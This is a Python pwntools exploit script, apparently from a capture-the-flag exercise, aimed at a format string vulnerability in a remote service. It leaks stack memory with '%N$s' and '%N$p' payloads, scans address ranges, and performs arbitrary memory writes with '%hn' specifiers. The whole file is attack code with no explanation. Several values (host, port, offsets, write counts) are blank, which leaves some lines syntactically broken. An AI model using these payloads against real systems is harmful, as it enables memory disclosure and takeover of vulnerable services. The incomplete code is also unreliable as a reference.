from pwn import *
import struct

def read_until(msg, r):
    out = ''
    while msg not in out:
        try:
            out += r.recv(1)
        except:
            return("ERROR")
    return (out)

def init_conn():
    r = remote("",)
    r.recv(10)
    r.send("")
    r.recv(10)
    r.send("")
    r.recv(55)
    return (r)

def dump(addr, frmt, off, r):
    # [addr][formatstring][EOF]
    # [format][padding........][EOF][addr]
    leak_part = "AAAA|%{}${}|".format(off ,frmt)
    out = leak_part
    out += "EOFF"
    out += struct.pack("<L", addr)
    try:
        r.send(out + "\n")
    except:
        return ("ERROR")
    r = read_until('EOFF', r)
    if r == "ERROR":
        return ("ERROR")
    return r.split('|')[1], r

# 0xbffff4fe
def search_addr():
    s_addr =
    r = init_conn()
    while s_addr > 0xbfff0000:
        leak = dump(s_addr, 's', , r)[0]
        print "[*] leak 0x{:08x}".format(s_addr)
        if leak == "ERROR":
            r.close()
            r = init_conn()
        else:
            s_addr += 1
            print " -----> {}".format(repr(leak))
        sleep(0.1)

def write_addr(addr):
    r = init_conn()
    p = struct.pack('<L', addr)
    p += "|%5$s|"
    r.send(p)
    print(repr(r.recv(100)))
    p = struct.pack('<L', addr)
    p += "|%20d%5$hn|"
    r.send(p)
    print(repr(r.recv(100)))
    p = struct.pack('<L', addr)
    p += "|%5$s|"
    r.send(p)
    print(repr(r.recv(100)))
    p = struct.pack('<L', addr)
    p += "|%5$s|"
    r.send(p)
    print(repr(r.recv(100)))
    r.send("quit\n")
    print(r.recv(150))
    r.close()

def print_addr(addr, r):
    p = struct.pack('<L', addr)
    p += "|%5$p|"
    r.send(p)
    print(repr(r.recv(100)))

def write_at(addr, r):
    p = struct.pack("<L", addr)
    p += struct.pack("<L", addr + 2)
    x = 
    y = 
    p += "%."
    p += str(x)
    p += "d%5$hn"
    p += "%."
    p += str(y)
    p += "d%6$hn\n"
    r.send(p)
    print(repr(r.recv(100)))

